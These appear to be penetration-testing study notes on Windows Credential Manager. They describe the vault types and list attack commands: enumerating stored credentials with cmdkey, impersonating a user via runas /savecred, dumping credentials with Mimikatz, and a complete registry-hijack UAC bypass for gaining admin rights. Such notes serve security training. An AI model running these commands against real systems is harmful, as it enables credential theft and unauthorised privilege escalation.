
Credential Manager is the user-facing feature/API while the actual encrypted stores are the vault/locker folders.

Web credentials - credentials associated with website and online accounts. This locker is used by Internet Explorer and legacy versions of Microsoft Edge

Windows Credentials - Used to store login tokens for various services such as OneDrive, and credentials related to domain users, local network resources, services, and shared directories.

Export Windows Vaults to .crd files
```cmd-session
rundll32 keymgr.dll,KRShowKeyMgr
```

##### cmdkey to enumerate stored credentials
```cmd-session
cmdkey /list
```

Target - resource or account name the credential is for
Type - the kind of credential
User 
Persistence - survive reboots

##### Impersonate user
```cmd-session
runas /savecred /user:SRV01\mcharles cmd
```

Extracting credentials with Mimikatz
```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::credman
```

##### Gain admin privileges
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe